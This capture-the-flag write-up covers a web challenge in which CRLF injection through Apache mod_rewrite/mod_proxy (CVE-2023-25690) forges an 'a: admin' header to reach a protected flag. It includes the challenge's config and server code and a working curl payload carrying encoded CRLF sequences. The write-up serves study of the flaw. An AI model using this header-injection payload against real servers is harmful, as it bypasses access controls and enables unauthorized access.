# 🛡️ Willy_Wonka_Web

---

## 🧪 Environment Setup

```bash
docker compose up --build
```

---

## 🌐 Description

```
Welcome to the world of web! Can you get the flag?

https://wonka.chal.cyberjousting.com
```

---

## 🔍 Initial View

- Landing page with a form input that sends requests to `/name/<input>`

---

## 📚 Background

- **CRLF Injection**
  - **CR** (Carriage Return): `\r`
  - **LF** (Line Feed): `\n`
  - Together: `\r\n` → CRLF is used to terminate HTTP headers
  - CRLF Injection allows attackers to:
    - Inject headers
    - Manipulate response structure
    - Exploit header-based logic

---

## 🔎 Code Analysis

### `httpd.conf`

```apache
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>
    ServerName localhost
    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on
    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
    ProxyPassReverse "/name/" "http://backend:3000/"

    RequestHeader unset A
    RequestHeader unset a
</VirtualHost>
```

- `/name/*` gets forwarded to `backend:3000`
- Strips all `A` or `a` headers from the original client request
- Rewrite rule injects user input directly into backend query parameter

---

### `server.js`

```js
const express = require('express');
const fs = require('fs');

const app = express();
const FLAG = fs.readFileSync('flag.txt', 'utf8').trim();
const PORT = 3000;

app.get('/', (req, res) => {
    if (req.header('a') && req.header('a') === 'admin') {
        return res.send(FLAG); // Flag returned only if header 'a: admin'
    }
    return res.send('Hello ' + req.query.name.replace("<", "").replace(">", "") + '!');
});

app.listen(PORT, () => {
    console.log(`Listening on ${PORT}`);
});
```

---

## 💥 Exploitation Overview

### 🔧 Behavior Flow

1. Client requests `/name/<input>`
2. Apache strips `a` headers from the original request
3. User input is inserted into backend query param → potential for CRLF injection

---

### 🛠️ Vulnerability Details

- **CVE-2023-25690**
  - Vulnerability in Apache’s `mod_rewrite` + `mod_proxy` when untrusted input is passed to rewrite rules with `[P]`
  - Allows CRLF injection in proxied backend requests
- Exploit chain:
  1. Inject CRLF (`%0D%0A`) into rewritten URL
  2. Forge a fake HTTP header (`a: admin`)
  3. Bypass frontend WAF stripping headers
  4. Backend receives injected header

### 🔐 WAF Behavior

- Apache’s `RequestHeader unset a` removes client-sent headers
- But doesn’t sanitize headers injected via URL during proxy rewrite

---

## 🚀 Exploit PoC

```bash
curl 'https://wonka.chal.cyberjousting.com/name/%0D%0Aa:admin%0D%0Asdf:'
```

- Explanation:
  - Injected headers:
    ```
    a: admin
    sdf:
    ```
  - Dummy header (`sdf:`) ensures the `a` header terminates cleanly
- Without dummy header, line might be interpreted as:
  ```
  a: admin HTTP/1.1
  ```

---

## 🧠 Key Takeaways

- Understand CRLF injection and how it manipulates HTTP request structure
- Know how Apache `mod_rewrite` and `mod_proxy` interact
- Learn how request header filtering via `RequestHeader unset` can be bypassed via rewrite URL injection
- Reference:
  - [CVE-2023-25690 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-25690)
  - [mod_rewrite Tech Details](https://httpd.apache.org/docs/2.4/rewrite/tech.html)
  - [PoC by dhmosfunk](https://github.com/dhmosfunk/CVE-2023-25690-POC)
